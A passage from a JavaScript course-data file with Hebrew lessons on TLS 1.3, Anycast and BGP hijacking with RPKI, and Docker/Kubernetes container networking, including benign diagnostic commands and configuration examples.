    if (exceeds_rate_limit(ip->saddr))
        return XDP_DROP;

    // Known attack signature
    if (matches_ddos_fingerprint(ctx))
        return XDP_DROP;

    return XDP_PASS; // legitimate traffic
}</code></pre></div>
<p><strong>הלקח</strong></p>
<p>הגבול בין רשתות לתכנות נמחק.</p>
<p><code>eBPF</code> מאפשר לבנות לוגיקת רשת מותאמת אישית.</p>
<p>פועלת מהר יותר מכל חומרה ייעודית — ישירות על שרתים רגילים.</p>
<p>זו הסיבה שחברות כמו <code>Google</code>, <code>Meta</code>, <code>Netflix</code> ו-<code>Cloudflare</code> משקיעות בכבדות ב-<code>eBPF</code>.</p>
</div>`
      }
    ]
  },
  {
    id: 306,
    title: "TLS 1.3 — מאפס ל-Handshake",
    pages: [
      {
        type: "explanation",
        title: "TLS 1.2 vs 1.3 — מה השתנה?",
        content: `<div dir="rtl">
<h2>למה TLS 1.3 שינה הכל</h2>
<p><code>TLS 1.2</code> יצא ב-2008 — עידן אחר.</p>
<p>תמך ב-<code>RC4</code>, <code>MD5</code>, <code>SHA-1</code> ואלגוריתמים שמאז הוכחו כשבורים.</p>
<p><strong>TLS 1.3</strong> — <code>RFC 8446</code>, שנת 2018</p>
<p>ניקה הכל וייעל מהיסוד.</p>
<table class="content-table">
  <tr><th>תכונה</th><th>TLS 1.2</th><th>TLS 1.3</th></tr>
  <tr><td><code>Handshake RTT</code></td><td>2 סיבובים</td><td>סיבוב אחד — 0 סיבובים אפשרי</td></tr>
  <tr><td><code>Cipher suites</code></td><td>37 אפשרויות</td><td>5 בלבד — כולן חזקות</td></tr>
  <tr><td><code>Forward Secrecy</code></td><td>אופציונלי</td><td>חובה תמיד</td></tr>
  <tr><td><code>RSA key exchange</code></td><td>נתמך</td><td>הוסר לחלוטין</td></tr>
  <tr><td><code>SHA-1</code> / <code>MD5</code></td><td>נתמכים</td><td>הוסרו לחלוטין</td></tr>
  <tr><td><code>RC4</code></td><td>נתמך</td><td>הוסר לחלוטין</td></tr>
</table>
<p><strong>מדוע הוסרו?</strong></p>
<ul>
<li><strong><code>RC4</code></strong> — חולשות קריפטוגרפיות מ-2013 מאפשרות לפענח 50% מהתעבורה אחרי 2 בחזקת 26 חיבורים</li>
<li><strong><code>MD5</code> ו-<code>SHA-1</code></strong> — הוכחו מתקפות התנגשות. <code>SHA-1</code> נשבר בפועל ב-2017 בפרויקט <code>Google SHAttered</code></li>
</ul>
<p><code>TLS 1.3</code> מאפשר רק <code>AES-GCM</code> ו-<code>ChaCha20-Poly1305</code>.</p>
</div>`
      },
      {
        type: "diagram",
        title: "1-RTT Handshake — TLS 1.3",
        content: `<div dir="rtl">
<h2>TLS 1.2 (2-RTT) vs TLS 1.3 (1-RTT)</h2>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <text x="60" y="14" text-anchor="middle" font-size="10" fill="#93c5fd">TLS 1.2 — 2 RTT</text>
  <text x="240" y="14" text-anchor="middle" font-size="10" fill="#86efac">TLS 1.3 — 1 RTT</text>
  <line x1="20" y1="20" x2="20" y2="128" stroke="#475569" stroke-width="1"/>
  <line x1="100" y1="20" x2="100" y2="128" stroke="#475569" stroke-width="1"/>
  <text x="20" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">C</text>
  <text x="100" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">S</text>
  <line x1="20" y1="35" x2="100" y2="45" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="34" text-anchor="middle" font-size="8" fill="#93c5fd">ClientHello</text>
  <line x1="100" y1="55" x2="20" y2="65" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="54" text-anchor="middle" font-size="8" fill="#86efac">ServerHello+Cert</text>
  <line x1="20" y1="75" x2="100" y2="85" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="74" text-anchor="middle" font-size="8" fill="#93c5fd">KeyExchange</text>
  <line x1="100" y1="95" x2="20" y2="105" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="94" text-anchor="middle" font-size="8" fill="#86efac">Finished</text>
  <line x1="200" y1="20" x2="200" y2="128" stroke="#475569" stroke-width="1"/>
  <line x1="280" y1="20" x2="280" y2="128" stroke="#475569" stroke-width="1"/>
  <text x="200" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">C</text>
  <text x="280" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">S</text>
  <line x1="200" y1="40" x2="280" y2="55" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="240" y="38" text-anchor="middle" font-size="8" fill="#93c5fd">ClientHello+KeyShare</text>
  <line x1="280" y1="65" x2="200" y2="80" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="240" y="63" text-anchor="middle" font-size="8" fill="#86efac">ServerHello+Finished</text>
  <line x1="200" y1="90" x2="280" y2="100" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="240" y="88" text-anchor="middle" font-size="8" fill="#fcd34d">Application Data</text>
  <defs><marker id="arr-tls" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
<p>ב-<code>TLS 1.2</code>, ה-<code>client</code> צריך לחכות ל-<code>ServerHello</code> לפני ששולח את ה-<code>KeyExchange</code>.</p>
<p>זה 2 סיבובי הלוך-חזור לפני שנתונים זורמים.</p>
<p>ב-<code>TLS 1.3</code>, ה-<code>client</code> שולח את ה-<code>KeyShare</code> כבר ב-<code>ClientHello</code> הראשון.</p>
<p>רק <code>RTT</code> אחד.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Forward Secrecy ו-0-RTT Resumption",
        content: `<div dir="rtl">
<h2>ECDHE ו-Perfect Forward Secrecy</h2>
<p><strong>Forward Secrecy</strong> — <code>PFS</code></p>
<p>גם אם תוקף גונב את ה-<code>private key</code> של השרת — הוא לא יכול לפענח שיחות עבר שהוקלטו.</p>
<p><strong>הבעיה ב-TLS 1.2 עם RSA</strong></p>
<p>ה-<code>client</code> מצפין את ה-<code>session key</code> ב-<code>public key</code> של השרת.</p>
<p>אם השרת נפרץ — כל השיחות ההיסטוריות ניתנות לפיענוח.</p>
<p><strong>הפתרון ב-TLS 1.3</strong></p>
<p>רק <code>ECDHE</code> — <code>Elliptic Curve Diffie-Hellman Ephemeral</code> — מותר.</p>
<p><code>Ephemeral</code> — המפתחות נוצרים מחדש לכל <code>session</code> ונמחקים אחריה.</p>
<p>אין מפתח ישן לניצול.</p>
<pre><code># בדיקת TLS של שרת
openssl s_client -connect example.com:443 -tls1_3

# מה לחפש בoutput:
# Protocol  : TLSv1.3
# Cipher    : TLS_AES_256_GCM_SHA384
# Server Temp Key: X25519, 253 bits  (ECDHE!)

# בדיקת certificate
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|Not After:|TLS"</code></pre>
<p><strong>0-RTT</strong> — <code>Early Data</code></p>
<p>ב-<code>TLS 1.3 session resumption</code>, ה-<code>client</code> יכול לשלוח נתוני אפליקציה בסיבוב הראשון.</p>
<p><strong>זהירות</strong></p>
<p><code>0-RTT</code> לא מגן מפני מתקפות <code>replay</code>.</p>
<p>מתאים רק לבקשות <code>GET</code> — לא ל-<code>POST</code> עם תופעות לוואי.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Cipher Suites ב-TLS 1.3",
        content: `<div dir="rtl">
<h2>5 Cipher Suites שנשארו</h2>
<p><code>TLS 1.2</code> תמך ב-37 <code>cipher suites</code> — רבים מהם שבורים או חלשים.</p>
<p><code>TLS 1.3</code> מאפשר רק 5.</p>
<p>כולם עם <strong>AEAD</strong> — <code>Authenticated Encryption with Associated Data</code>.</p>
<ul>
  <li><code>TLS_AES_128_GCM_SHA256</code> — הנפוץ ביותר, מהיר בחומרה עם <code>AES-NI</code></li>
  <li><code>TLS_AES_256_GCM_SHA384</code> — אבטחה גבוהה, מומלץ למידע מסווג</li>
  <li><code>TLS_CHACHA20_POLY1305_SHA256</code> — מהיר במכשירים ללא חומרת <code>AES</code> — מובייל</li>
  <li><code>TLS_AES_128_CCM_SHA256</code> — מכשירי <code>IoT</code></li>
  <li><code>TLS_AES_128_CCM_8_SHA256</code> — <code>IoT</code> עם רוחב פס מוגבל</li>
</ul>
<p><strong>AEAD</strong> — הצפנה ואימות באופרציה אחת</p>
<p>ב-<code>TLS 1.2</code> עם <code>CBC+HMAC</code>, האימות היה שלב נפרד.</p>
<p>הפרדה זו גרמה לפגיעויות כמו <code>BEAST</code> ו-<code>POODLE</code>.</p>
<p>עם <code>GCM</code> — אם מישהו שינה את ה-<code>ciphertext</code>, הפענוח נכשל מיידית.</p>
<p><strong>ההשפעה בפועל</strong></p>
<p><code>HTTPS</code> עם <code>TLS 1.3</code> לוקח 50-100 מילישניות פחות ל-<code>first byte</code> בחיבורים חדשים.</p>
<p>על מובייל, עם <code>latency</code> גבוה, ההבדל מורגש בבירור.</p>
</div>`
      }
    ]
  },
  {
    id: 307,
    title: "Anycast ו-BGP Routing Security",
    pages: [
      {
        type: "explanation",
        title: "Anycast — כשאותה IP מגיעה ממקומות רבים",
        content: `<div dir="rtl">
<h2>Anycast — כיצד Cloudflare מגיש 1.1.1.1 מ-300 מקומות</h2>
<p>כשאתם שולחים שאילתה ל-<code>1.1.1.1</code> — <code>Cloudflare DNS</code> — הבקשה מגיעה ל-<code>POP</code> הקרוב אליכם.</p>
<p>בתל אביב, לונדון, או ניו יורק.</p>
<p>כולם עם <strong>אותה כתובת IP</strong>.</p>
<p>זה <strong><code>Anycast</code></strong>.</p>
<p><strong>כיצד זה עובד?</strong></p>
<p><code>Cloudflare</code> מפרסמת את ה-<code>prefix</code> <code>1.1.1.1/32</code> ב-<code>BGP</code> מ-300 מיקומים שונים.</p>
<p><code>BGP routers</code> בוחרים תמיד את ה-<code>shortest AS path</code> — כלומר ה-<code>POP</code> הקרוב ביותר.</p>
<p>התעבורה מנותבת אוטומטית לשרת הקרוב.</p>
<table class="content-table">
  <tr><th>Anycast יתרונות</th><th>פרטים</th></tr>
  <tr><td><code>Latency</code></td><td>תמיד ה-<code>POP</code> הקרוב — הפחתת 50-200 מילישניות</td></tr>
  <tr><td>הגנת <code>DDoS</code></td><td>מתקפה מחולקת בין כל ה-<code>POPs</code> בעולם</td></tr>
  <tr><td><code>Failover</code></td><td><code>POP</code> שנפל — <code>BGP</code> מסיר את ה-<code>prefix</code> אוטומטית</td></tr>
  <tr><td><code>Scalability</code></td><td>הוסף <code>POP</code> חדש = הוסף <code>BGP peer</code></td></tr>
</table>
<p><strong>שימושים נפוצים</strong></p>
<ul>
<li><code>DNS</code> — כל ה-<code>root nameservers</code> הם <code>Anycast</code></li>
<li><code>CDN</code> — הגשת תוכן מהמיקום הקרוב</li>
<li>הגנת <code>DDoS</code> — פיזור מתקפה בין כל ה-<code>POPs</code></li>
</ul>
<p><strong>מגבלה</strong></p>
<p>לא מתאים לחיבורי <code>TCP</code> ארוכים.</p>
<p>החיבור עלול לעבור ל-<code>POP</code> אחר בין <code>packets</code> — וזה ישבור את החיבור.</p>
</div>`
      },
      {
        type: "explanation",
        title: "BGP Hijacking ו-RPKI",
        content: `<div dir="rtl">
<h2>Pakistan Telecom 2008 — כשהאינטרנט נשבר לשעה</h2>
<p>פברואר 2008.</p>
<p><code>Pakistan Telecom</code> קיבלה הוראה לחסום <code>YouTube</code>.</p>
<p>הם הוסיפו <code>route</code> ל-<code>BGP</code> שאמר — אני מגיש את <code>208.65.153.0/24</code>.</p>
<p>הבעיה — ה-<code>route</code> הזה הופץ לכל האינטרנט.</p>
<p>במשך שעה, תעבורת <code>YouTube</code> מרחבי העולם הגיעה ל-<code>Pakistan Telecom</code> — ונעלמה.</p>
<p><strong>הסיבה</strong></p>
<p><code>BGP</code> מסורתי הוא <strong>trust-based</strong>.</p>
<p>כל <code>AS</code> יכול להכריז על כל <code>prefix</code> — אין אימות.</p>
<p>מספיק ש-<code>router</code> אחד טעה — וה-<code>prefix</code> השגוי מגיע לכולם.</p>
<p><strong>הפתרון — RPKI</strong></p>
<p><code>Resource Public Key Infrastructure</code></p>
<p>מאגר חתום קריפטוגרפית של מי מורשה להכריז על איזה <code>prefix</code>.</p>
<pre><code># ROA — Route Origin Authorization
# "AS 13335 (Cloudflare) מורשה להכריז על 1.1.1.0/24"
{
  "asn": "AS13335",
  "prefix": "1.1.1.0/24",
  "maxLength": 24,
  "ta": "RIPE NCC"
}

# בדיקת ROA
curl https://stat.ripe.net/data/rpki-validation/data.json?resource=1.1.1.0/24

# bgpq4 — filter routes based on RPKI
bgpq4 -4 -A -J AS13335</code></pre>
</div>`
      },
      {
        type: "diagram",
        title: "BGP Hijack Incidents — טבלה היסטורית",
        content: `<div dir="rtl">
<h2>אירועי BGP Hijacking מפורסמים</h2>
<table class="content-table">
  <tr><th>שנה</th><th>מי</th><th>מה קרה</th><th>השפעה</th></tr>
  <tr><td>2008</td><td><code>Pakistan Telecom</code></td><td>חטיפת <code>prefix</code> של <code>YouTube</code></td><td><code>YouTube</code> נפל לשעה — ברחבי העולם</td></tr>
  <tr><td>2010</td><td><code>China Telecom</code></td><td>חטיפת 15% מה-<code>routes</code> למשך 18 דקות</td><td>תעבורת ממשל וצבא ארה"ב עברה דרך סין</td></tr>
  <tr><td>2018</td><td><code>eNet</code> — <code>AS10297</code></td><td>חטיפת <code>Amazon Route53</code></td><td>פישינג של <code>MyEtherWallet</code> — 160 אלף דולר נגנבו</td></tr>
  <tr><td>2019</td><td>מרכז נתונים שוויצרי</td><td>דליפת <code>routes</code> של <code>Google</code></td><td><code>Gmail</code> ו-<code>YouTube</code> נפגעו באירופה</td></tr>
  <tr><td>2021</td><td><code>Vodafone AS55410</code></td><td>חטיפת <code>prefixes</code> של <code>Facebook</code></td><td>תרם לנפילת <code>Facebook</code> באוקטובר 2021</td></tr>
</table>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">RPKI Validation Flow</text>
  <rect x="10" y="25" width="80" height="35" rx="5" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="50" y="40" text-anchor="middle" font-size="9" fill="#93c5fd">RIR (RIPE/ARIN)</text>
  <text x="50" y="53" text-anchor="middle" font-size="8" fill="#64748b">signs ROAs</text>
  <rect x="140" y="25" width="80" height="35" rx="5" fill="#1e293b" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="180" y="40" text-anchor="middle" font-size="9" fill="#fcd34d">Router</text>
  <text x="180" y="53" text-anchor="middle" font-size="8" fill="#64748b">validates ROA</text>
  <rect x="270" y="25" width="80" height="35" rx="5" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="310" y="40" text-anchor="middle" font-size="9" fill="#86efac">Valid route</text>
  <text x="310" y="53" text-anchor="middle" font-size="8" fill="#64748b">accepted</text>
  <rect x="270" y="80" width="80" height="35" rx="5" fill="#1e293b" stroke="#ef4444" stroke-width="1.5"/>
  <text x="310" y="95" text-anchor="middle" font-size="9" fill="#fca5a5">Invalid route</text>
  <text x="310" y="108" text-anchor="middle" font-size="8" fill="#64748b">dropped</text>
  <line x1="90" y1="42" x2="140" y2="42" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-rpki)"/>
  <line x1="220" y1="36" x2="270" y2="36" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-rpki)"/>
  <line x1="220" y1="52" x2="270" y2="88" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arr-rpki)"/>
  <defs><marker id="arr-rpki" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
<p><strong>אימוץ RPKI</strong></p>
<p>נכון ל-2024, כ-40% מה-<code>BGP routes</code> העולמיים מוגנים ב-<code>RPKI</code>.</p>
<p><code>Cloudflare</code>, <code>AWS</code> ו-<code>Google</code> — כולם חותמים את ה-<code>ROAs</code> שלהם.</p>
<p>ספקי אינטרנט גדולים כבר מסננים <code>routes</code> לא תקינים.</p>
</div>`
      }
    ]
  },
  {
    id: 308,
    title: "Container Networking — כיצד Pods מדברים",
    pages: [
      {
        type: "explanation",
        title: "Linux Network Namespaces",
        content: `<div dir="rtl">
<h2>הבידוד שמאחורי Docker</h2>
<p>כשמריצים <code>container</code> ב-<code>Docker</code>, הוא מקבל <strong>network namespace</strong> משלו.</p>
<p>זוהי מנגנון בידוד של הגרעין.</p>
<p>ה-<code>container</code> חושב שיש לו מחסנית רשת נפרדת לחלוטין.</p>
<ul>
<li><code>interfaces</code> משלו</li>
<li><code>routing table</code> משלו</li>
<li>כללי <code>iptables</code> משלו</li>
</ul>
<pre><code># יצירת namespace ידנית (מה שDocker עושה אוטומטית)
ip netns add container1

# הרצת פקודה בnamespace
ip netns exec container1 ip addr show

# יצירת veth pair (virtual ethernet cable)
ip link add veth0 type veth peer name veth1

# העברת קצה אחד לnamespace
ip link set veth1 netns container1

# הוספה לbridge
ip link set veth0 master docker0

# הפעלה
ip netns exec container1 ip link set veth1 up
ip netns exec container1 ip addr add 172.17.0.2/16 dev veth1</code></pre>
<p><strong><code>veth pair</code></strong></p>
<p>כל <code>container</code> מקבל <code>veth pair</code> — כבל וירטואלי שמקשר בין ה-<code>namespace</code> ל-<code>bridge</code> של ה-<code>host</code>.</p>
<p>ה-<code>bridge docker0</code> הוא ה-<code>switch</code> הווירטואלי שמחבר את כל ה-<code>containers</code> ביחד.</p>
</div>`
      },
      {
        type: "diagram",
        title: "Docker Networking Architecture",
        content: `<div dir="rtl">
<h2><code>veth pairs</code>, <code>Bridge</code> ו-<code>NAT</code></h2>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <rect x="5" y="5" width="350" height="120" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
  <text x="180" y="18" text-anchor="middle" font-size="9" fill="#64748b">Host Network Namespace</text>
  <rect x="20" y="25" width="70" height="35" rx="4" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="55" y="40" text-anchor="middle" font-size="8" fill="#93c5fd">Container 1</text>
  <text x="55" y="52" text-anchor="middle" font-size="8" fill="#64748b">eth0: 172.17.0.2</text>
  <rect x="140" y="25" width="70" height="35" rx="4" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="175" y="40" text-anchor="middle" font-size="8" fill="#93c5fd">Container 2</text>
  <text x="175" y="52" text-anchor="middle" font-size="8" fill="#64748b">eth0: 172.17.0.3</text>
  <rect x="260" y="25" width="70" height="35" rx="4" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="295" y="40" text-anchor="middle" font-size="8" fill="#93c5fd">Container 3</text>
  <text x="295" y="52" text-anchor="middle" font-size="8" fill="#64748b">eth0: 172.17.0.4</text>
  <rect x="80" y="80" width="200" height="28" rx="4" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="180" y="92" text-anchor="middle" font-size="9" fill="#86efac">docker0 bridge (172.17.0.1)</text>
  <text x="180" y="104" text-anchor="middle" font-size="8" fill="#64748b">virtual switch</text>
  <line x1="55" y1="60" x2="100" y2="80" stroke="#475569" stroke-width="1.5"/>
  <line x1="175" y1="60" x2="175" y2="80" stroke="#475569" stroke-width="1.5"/>
  <line x1="295" y1="60" x2="260" y2="80" stroke="#475569" stroke-width="1.5"/>
  <text x="55" y="73" text-anchor="middle" font-size="7" fill="#94a3b8">veth</text>
  <text x="175" y="73" text-anchor="middle" font-size="7" fill="#94a3b8">veth</text>
  <text x="295" y="73" text-anchor="middle" font-size="7" fill="#94a3b8">veth</text>
</svg>
</div>
<p>כש-<code>Container 1</code> שולח <code>packet</code> ל-<code>Container 2</code>:</p>
<ol>
<li>ה-<code>veth pair</code> מוציא את ה-<code>packet</code> ל-<code>bridge docker0</code></li>
<li>ה-<code>bridge</code> מחפש את ה-<code>MAC</code> של היעד ב-<code>forwarding table</code></li>
<li>ה-<code>bridge</code> שולח ל-<code>veth</code> של <code>Container 2</code></li>
</ol>
<p><strong>לתעבורה חיצונית</strong></p>
<p><code>iptables MASQUERADE</code> — כלומר <code>NAT</code> — מחליף את ה-<code>source IP</code> ב-<code>IP</code> של ה-<code>host</code>.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Kubernetes Pod Networking",
        content: `<div dir="rtl">
<h2>Pod-to-Pod — אותו Node מול Cross-Node</h2>
<p><code>Kubernetes</code> דורש שכל <code>Pod</code> יוכל לדבר עם כל <code>Pod</code> אחר — ללא <code>NAT</code>.</p>
<p>זו ה-<strong>CNI contract</strong> — <code>Container Network Interface</code>.</p>
<p><strong>אותו node</strong></p>
<p>בדיוק כמו <code>Docker</code> — <code>veth pairs</code> ל-<code>bridge</code>.</p>
<p>ה-<code>packets</code> עוברים דרך ה-<code>bridge</code> ב-<code>L2</code>.</p>
<p><strong>Cross-node</strong></p>
<p>כאן נכנסים <code>CNI plugins</code>.</p>
<table class="content-table">
  <tr><th>CNI Plugin</th><th>טכנולוגיה</th><th>יתרון</th><th>חיסרון</th></tr>
  <tr><td><code>Flannel</code></td><td><code>VXLAN overlay</code></td><td>פשוט, עובד בכל מקום</td><td><code>overhead</code> של עטיפה</td></tr>
  <tr><td><code>Calico</code></td><td><code>BGP routing</code></td><td>ביצועים גבוהים, <code>Network Policy</code></td><td>מורכב יותר להגדרה</td></tr>
  <tr><td><code>Cilium</code></td><td><code>eBPF</code></td><td>נראות <code>L7</code>, חיפוש <code>O(1)</code></td><td>דורש <code>kernel</code> חדש</td></tr>
</table>
<pre><code># בדיקת interfaces ב-node
ip link show type veth

# Pod CIDR בkubernetes
kubectl get nodes -o jsonpath='{.items[*].spec.podCIDR}'

# Cilium connectivity check
cilium connectivity test

# tcpdump על veth של pod
VETH=$(ip link | grep -o "vethABCDEF")
tcpdump -i $VETH -n</code></pre>
<p><strong><code>Flannel VXLAN</code></strong></p>
<p><code>packets</code> בין <code>nodes</code> עוטפים ב-<code>UDP</code> פורט 8472.</p>
<p>ה-<code>CNI</code> יוצר מנהרה.</p>
<p><strong><code>Calico BGP</code></strong></p>
<p>כל <code>node</code> הוא <code>BGP router</code> שמפרסם את ה-<code>pod CIDR</code> שלו.</p>
<p>ה-<code>packets</code> עוברים ב-<code>L3</code> ישירות, ללא עטיפה — מהיר יותר.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Cilium ו-eBPF Networking",
        content: `<div dir="rtl">
<h2>הדור הבא — eBPF מחליף iptables</h2>
<p><code>iptables</code> ב-<code>Kubernetes</code> עם 1000 שירותים = יותר מ-50,000 כללים.</p>
<p>כל <code>packet</code> עובר סריקה ליניארית — <code>O(n)</code>.</p>
<p>כל שירות חדש מאט את הרשת.</p>
<p><code>Cilium</code> מחליף את <code>iptables</code> ב-<code>eBPF hash maps</code>.</p>
<p>כל חיפוש הוא <code>O(1)</code>, ללא תלות בכמות השירותים.</p>
<pre><code># Hubble — observability layer של Cilium
hubble observe --namespace production

# ראיית כל TCP flows
hubble observe --protocol TCP --verdict DROPPED

# Layer 7 visibility (HTTP)
hubble observe --http-status-code 500

# Cilium Network Policy — L7 HTTP
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-api
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: frontend
    toPorts:
    - ports:
      - port: "8080"
        protocol: TCP
      rules:
        http:
        - method: GET
          path: "/api/.*"</code></pre>
<p><strong><code>Hubble</code></strong> — נראות בזמן אמת</p>
<p>מציג את כל התעבורה בין <code>pods</code>:</p>
<ul>
<li>איזה <code>pod</code> מדבר עם איזה</li>
<li><code>HTTP status codes</code></li>
<li><code>latency</code></li>
</ul>
<p>הכל בלי <code>instrumentation</code> של האפליקציה.</p>
<p>זהו <strong>service mesh</strong> ללא <code>sidecar</code>.</p>
</div>`
      }
    ]
  }
]
  }
]

// Backward compatibility — defaults to networking track chapters
export const chapters = tracks[0].chapters
